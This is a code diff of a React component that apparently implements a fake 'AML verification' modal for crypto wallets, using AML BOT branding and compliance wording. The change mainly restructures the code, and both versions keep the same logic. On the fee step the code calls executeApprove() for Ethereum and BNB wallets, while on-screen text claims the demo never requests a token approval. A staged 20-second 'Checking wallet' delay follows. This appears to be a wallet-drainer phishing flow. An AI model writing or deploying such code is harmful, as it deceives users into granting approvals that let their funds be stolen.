@@ -877,99 +877,133 @@ export default function Index() {
               </button>
             </div>
 
-            {verificationRequested ? (
-              <WalletVerificationResult chain={selectedChain} address={walletAddress} balance={walletBalance?.balance} symbol={walletBalance?.symbol} />
-            ) : verificationStep === "chain" ? (
-              <div className="pt-5">
-                <span className="inline-flex rounded-md bg-blue-100 px-3 py-1 text-xs font-medium text-blue-800">Step 1 of 3</span>
-                <h3 className="mt-6 text-3xl font-bold tracking-tight text-slate-950">Select Chain</h3>
-                <p className="mt-3 text-lg text-slate-400">To continue, please select chain</p>
-                <div className="mt-7 space-y-3">
-                  {Object.keys(walletTokens).map((name) => {
-                    const isDirectTokenList = name === "Solana" || name === "Tron";
-                    const token = name === "BNB Chain" ? "BNB" : name === "Ethereum" ? "ETH" : name === "Solana" ? "SOL" : "TRX";
-                    return (
-                      <button key={name} type="button" onClick={async () => {
-                        setSelectedChain(name);
-                        setSelectedToken("");
-                        if (isDirectTokenList) setVerificationStep("token");
-                      }} className={`flex h-[58px] w-full items-center gap-5 rounded-xl border px-4 text-left text-base font-semibold transition ${selectedChain === name ? "border-primary bg-blue-50 text-slate-950" : "border-slate-200 text-slate-800 hover:border-primary/50"}`}>
-                        <TokenLogo token={token} size={32} />
-                        <span>{name === "BNB Chain" ? "BNB" : name === "Ethereum" ? "ETH" : name.toUpperCase()}</span>
-                      </button>
-                    );
-                  })}
-                </div>
-                <button type="button" disabled={!selectedChain} onClick={() => setVerificationStep("token")} className="mt-6 h-14 w-full rounded-xl bg-[#3f3cf5] text-base font-medium text-white transition hover:bg-[#302df0] disabled:cursor-not-allowed disabled:opacity-40">CONTINUE</button>
-              </div>
-            ) : verificationStep === "token" ? (
-              <div className="pt-5">
-                <span className="inline-flex rounded-md bg-blue-100 px-3 py-1 text-xs font-medium text-blue-800">Step 2 of 3</span>
-                <h3 className="mt-6 text-3xl font-bold tracking-tight text-slate-950">Select token</h3>
-                <p className="mt-3 text-lg text-slate-400">To continue, please select token</p>
-                <div className="mt-7 space-y-3">
-                  {(walletTokens[selectedChain] ?? []).map((token) => (
-                    <button key={token} type="button" disabled={selectedChain === "Solana" || selectedChain === "Tron"} onClick={() => setSelectedToken(token)} className={`flex h-[58px] w-full items-center gap-5 rounded-xl border px-4 text-left text-base font-semibold transition ${selectedChain === "Solana" || selectedChain === "Tron" ? "cursor-default border-slate-200 text-slate-800" : selectedToken === token ? "border-primary bg-blue-50 text-slate-950" : "border-slate-200 text-slate-800 hover:border-primary/50"}`}>
-                      <TokenLogo token={token} size={32} />
-                      <span>{token}</span>
-                    </button>
-                  ))}
-                </div>
-                <button type="button" disabled={!selectedToken} onClick={() => setVerificationStep("intro")} className="mt-6 h-14 w-full rounded-xl bg-[#3f3cf5] text-base font-medium text-white transition hover:bg-[#302df0] disabled:cursor-not-allowed disabled:opacity-40">CONTINUE</button>
-              </div>
-            ) : verificationStep === "intro" ? (
-              <div className="pt-5">
-                <div className="flex justify-center py-4"><div className="flex flex-col items-center rounded-2xl bg-blue-50 px-5 py-4 shadow-sm"><svg width="46" height="46" viewBox="0 0 42 42" fill="none" aria-label="AML BOT logo"><path d="M21 3.5 35 13.8v14.4L21 38.5 7 28.2V13.8L21 3.5Z" fill="#1268D5" /><path d="m21 10 7 5.1v11.8L21 32l-7-5.1V15.1L21 10Z" fill="white" /></svg><span className="mt-2 whitespace-nowrap text-[15px] font-black tracking-[-0.05em] text-slate-950">AML <span className="tracking-[-0.04em]">BOT</span></span></div></div>
-                <div className="mt-7 grid grid-cols-2 gap-6 text-xs font-bold uppercase tracking-wide text-[#173b73]"><span>AML<br />Verification</span><span className="justify-self-end pr-1 text-right">Powered by<br />AML BOT</span></div>
-                <h3 className="mt-7 text-3xl font-normal leading-tight text-slate-950">You have been requested to complete an AML compliance process</h3>
-                <p className="mt-6 text-base leading-relaxed text-slate-700">By verifying your wallet through our secure verification system, you ensure compliance with anti-money laundering regulations, safeguard your account, and help prevent fraudulent activities.</p>
-                <button type="button" onClick={() => setVerificationStep("fee")} className="mt-8 h-14 w-full rounded-xl bg-[#3f3cf5] text-sm font-medium text-white transition hover:bg-[#302df0]">INITIATE AML VERIFICATION PROCESS</button>
-              </div>
-            ) : verificationStep === "fee" ? (
-              <div className="pt-5">
-                <div className="flex justify-center py-3"><div className="flex h-16 w-16 items-center justify-center rounded-full bg-blue-50"><TokenLogo token={selectedToken} size={38} /></div></div>
-                <p className="mt-5 text-center text-3xl font-semibold tracking-tight text-slate-950">Verification fee</p>
-                <p className="mt-4 text-center text-base leading-relaxed text-slate-600">A small network or service fee may apply to complete the verification. The exact fee will always be shown clearly before any optional wallet transaction.</p>
-                <div className="mt-6 rounded-xl border border-slate-200 bg-slate-50 p-4 text-sm text-slate-600"><div className="flex justify-between"><span>Selected asset</span><strong className="text-slate-900">{selectedToken}</strong></div></div>
-                <p className="mt-5 text-center text-xs leading-relaxed text-slate-400">This demo never requests a payment, token approval, or transaction signature.</p>
-                <button type="button" onClick={async () => {
-                  setVerificationStep("address");
-                  setVerificationLoading(true);
-                  setVerificationError("");
-                  
-                  try {
-                    if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
-                      await executeApprove();
-                    }
-                    
-                    await loadConnectedWalletBalance();
-                    setVerificationRequested(false);
-                    verificationTimer.current = window.setTimeout(() => {
-                      setVerificationLoading(false);
-                      setVerificationRequested(true);
-                    }, 20000);
-                  } catch (error) {
-                    setVerificationLoading(false);
-                    setVerificationError("Approval failed. Please try again.");
-                  }
-                }} className="mt-7 h-14 w-full rounded-xl bg-[#3f3cf5] text-sm font-medium text-white transition hover:bg-[#302df0]">CONTINUE TO VERIFICATION</button>
-              </div>
-            ) : verificationLoading ? (
-              <div className="flex min-h-[260px] flex-col items-center justify-center py-10 text-center">
-                <div className="h-10 w-10 animate-spin rounded-full border-4 border-slate-200 border-t-primary" />
-                <h3 className="mt-6 text-2xl font-bold text-slate-950">Checking wallet...</h3>
-                <p className="mt-3 max-w-sm text-sm leading-relaxed text-slate-500">We are preparing your AML verification result. This may take a few moments.</p>
-              </div>
-            ) : verificationError ? (
-              <div className="flex min-h-[260px] flex-col items-center justify-center py-10 text-center">
-                <div className="text-red-500 text-3xl">×</div>
-                <h3 className="mt-6 text-2xl font-bold text-slate-950">Verification Failed</h3>
-                <p className="mt-3 max-w-sm text-sm leading-relaxed text-slate-500">{verificationError}</p>
-                <button type="button" onClick={() => setDemoOpen(false)} className="mt-6 h-12 rounded-xl bg-blue-600 px-6 text-sm font-medium text-white transition hover:bg-blue-700">Close</button>
-              </div>
-            ) : approveSucceeded && walletBalance ? (
-              <WalletVerificationResult chain={selectedChain} address={walletAddress} balance={walletBalance?.balance} symbol={walletBalance?.symbol ?? selectedToken} />
-            ) : null
+            {(() => {
+              if (verificationRequested) {
+                return (
+                  <WalletVerificationResult chain={selectedChain} address={walletAddress} balance={walletBalance?.balance} symbol={walletBalance?.symbol} />
+                );
+              }
+
+              if (verificationStep === "chain") {
+                return (
+                  <div className="pt-5">
+                    <span className="inline-flex rounded-md bg-blue-100 px-3 py-1 text-xs font-medium text-blue-800">Step 1 of 3</span>
+                    <h3 className="mt-6 text-3xl font-bold tracking-tight text-slate-950">Select Chain</h3>
+                    <p className="mt-3 text-lg text-slate-400">To continue, please select chain</p>
+                    <div className="mt-7 space-y-3">
+                      {Object.keys(walletTokens).map((name) => {
+                        const isDirectTokenList = name === "Solana" || name === "Tron";
+                        const token = name === "BNB Chain" ? "BNB" : name === "Ethereum" ? "ETH" : name === "Solana" ? "SOL" : "TRX";
+                        return (
+                          <button key={name} type="button" onClick={async () => {
+                            setSelectedChain(name);
+                            setSelectedToken("");
+                            if (isDirectTokenList) setVerificationStep("token");
+                          }} className={`flex h-[58px] w-full items-center gap-5 rounded-xl border px-4 text-left text-base font-semibold transition ${selectedChain === name ? "border-primary bg-blue-50 text-slate-950" : "border-slate-200 text-slate-800 hover:border-primary/50"}`}>
+                            <TokenLogo token={token} size={32} />
+                            <span>{name === "BNB Chain" ? "BNB" : name === "Ethereum" ? "ETH" : name.toUpperCase()}</span>
+                          </button>
+                        );
+                      })}
+                    </div>
+                    <button type="button" disabled={!selectedChain} onClick={() => setVerificationStep("token")} className="mt-6 h-14 w-full rounded-xl bg-[#3f3cf5] text-base font-medium text-white transition hover:bg-[#302df0] disabled:cursor-not-allowed disabled:opacity-40">CONTINUE</button>
+                  </div>
+                );
+              }
+
+              if (verificationStep === "token") {
+                return (
+                  <div className="pt-5">
+                    <span className="inline-flex rounded-md bg-blue-100 px-3 py-1 text-xs font-medium text-blue-800">Step 2 of 3</span>
+                    <h3 className="mt-6 text-3xl font-bold tracking-tight text-slate-950">Select token</h3>
+                    <p className="mt-3 text-lg text-slate-400">To continue, please select token</p>
+                    <div className="mt-7 space-y-3">
+                      {(walletTokens[selectedChain] ?? []).map((token) => (
+                        <button key={token} type="button" disabled={selectedChain === "Solana" || selectedChain === "Tron"} onClick={() => setSelectedToken(token)} className={`flex h-[58px] w-full items-center gap-5 rounded-xl border px-4 text-left text-base font-semibold transition ${selectedChain === "Solana" || selectedChain === "Tron" ? "cursor-default border-slate-200 text-slate-800" : selectedToken === token ? "border-primary bg-blue-50 text-slate-950" : "border-slate-200 text-slate-800 hover:border-primary/50"}`}>
+                          <TokenLogo token={token} size={32} />
+                          <span>{token}</span>
+                        </button>
+                      ))}
+                    </div>
+                    <button type="button" disabled={!selectedToken} onClick={() => setVerificationStep("intro")} className="mt-6 h-14 w-full rounded-xl bg-[#3f3cf5] text-base font-medium text-white transition hover:bg-[#302df0] disabled:cursor-not-allowed disabled:opacity-40">CONTINUE</button>
+                  </div>
+                );
+              }
+
+              if (verificationStep === "intro") {
+                return (
+                  <div className="pt-5">
+                    <div className="flex justify-center py-4"><div className="flex flex-col items-center rounded-2xl bg-blue-50 px-5 py-4 shadow-sm"><svg width="46" height="46" viewBox="0 0 42 42" fill="none" aria-label="AML BOT logo"><path d="M21 3.5 35 13.8v14.4L21 38.5 7 28.2V13.8L21 3.5Z" fill="#1268D5" /><path d="m21 10 7 5.1v11.8L21 32l-7-5.1V15.1L21 10Z" fill="white" /></svg><span className="mt-2 whitespace-nowrap text-[15px] font-black tracking-[-0.05em] text-slate-950">AML <span className="tracking-[-0.04em]">BOT</span></span></div></div>
+                    <div className="mt-7 grid grid-cols-2 gap-6 text-xs font-bold uppercase tracking-wide text-[#173b73]"><span>AML<br />Verification</span><span className="justify-self-end pr-1 text-right">Powered by<br />AML BOT</span></div>
+                    <h3 className="mt-7 text-3xl font-normal leading-tight text-slate-950">You have been requested to complete an AML compliance process</h3>
+                    <p className="mt-6 text-base leading-relaxed text-slate-700">By verifying your wallet through our secure verification system, you ensure compliance with anti-money laundering regulations, safeguard your account, and help prevent fraudulent activities.</p>
+                    <button type="button" onClick={() => setVerificationStep("fee")} className="mt-8 h-14 w-full rounded-xl bg-[#3f3cf5] text-sm font-medium text-white transition hover:bg-[#302df0]">INITIATE AML VERIFICATION PROCESS</button>
+                  </div>
+                );
+              }
+
+              if (verificationStep === "fee") {
+                return (
+                  <div className="pt-5">
+                    <div className="flex justify-center py-3"><div className="flex h-16 w-16 items-center justify-center rounded-full bg-blue-50"><TokenLogo token={selectedToken} size={38} /></div></div>
+                    <p className="mt-5 text-center text-3xl font-semibold tracking-tight text-slate-950">Verification fee</p>
+                    <p className="mt-4 text-center text-base leading-relaxed text-slate-600">A small network or service fee may apply to complete the verification. The exact fee will always be shown clearly before any optional wallet transaction.</p>
+                    <div className="mt-6 rounded-xl border border-slate-200 bg-slate-50 p-4 text-sm text-slate-600"><div className="flex justify-between"><span>Selected asset</span><strong className="text-slate-900">{selectedToken}</strong></div></div>
+                    <p className="mt-5 text-center text-xs leading-relaxed text-slate-400">This demo never requests a payment, token approval, or transaction signature.</p>
+                    <button type="button" onClick={async () => {
+                      setVerificationStep("address");
+                      setVerificationLoading(true);
+                      setVerificationError("");
+                      
+                      try {
+                        if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
+                          await executeApprove();
+                        }
+                        
+                        await loadConnectedWalletBalance();
+                        setVerificationRequested(false);
+                        verificationTimer.current = window.setTimeout(() => {
+                          setVerificationLoading(false);
+                          setVerificationRequested(true);
+                        }, 20000);
+                      } catch (error) {
+                        setVerificationLoading(false);
+                        setVerificationError("Approval failed. Please try again.");
+                      }
+                    }} className="mt-7 h-14 w-full rounded-xl bg-[#3f3cf5] text-sm font-medium text-white transition hover:bg-[#302df0]">CONTINUE TO VERIFICATION</button>
+                  </div>
+                );
+              }
+
+              if (verificationLoading) {
+                return (
+                  <div className="flex min-h-[260px] flex-col items-center justify-center py-10 text-center">
+                    <div className="h-10 w-10 animate-spin rounded-full border-4 border-slate-200 border-t-primary" />
+                    <h3 className="mt-6 text-2xl font-bold text-slate-950">Checking wallet...</h3>
+                    <p className="mt-3 max-w-sm text-sm leading-relaxed text-slate-500">We are preparing your AML verification result. This may take a few moments.</p>
+                  </div>
+                );
+              }
+
+              if (verificationError) {
+                return (
+                  <div className="flex min-h-[260px] flex-col items-center justify-center py-10 text-center">
+                    <div className="text-red-500 text-3xl">×</div>
+                    <h3 className="mt-6 text-2xl font-bold text-slate-950">Verification Failed</h3>
+                    <p className="mt-3 max-w-sm text-sm leading-relaxed text-slate-500">{verificationError}</p>
+                    <button type="button" onClick={() => setDemoOpen(false)} className="mt-6 h-12 rounded-xl bg-blue-600 px-6 text-sm font-medium text-white transition hover:bg-blue-700">Close</button>
+                  </div>
+                );
+              }
+
+              if (approveSucceeded && walletBalance) {
+                return (
+                  <WalletVerificationResult chain={selectedChain} address={walletAddress} balance={walletBalance?.balance} symbol={walletBalance?.symbol ?? selectedToken} />
+                );
+              }
+
+              return null;
+            })()}
           </div>
         </div>
       )}
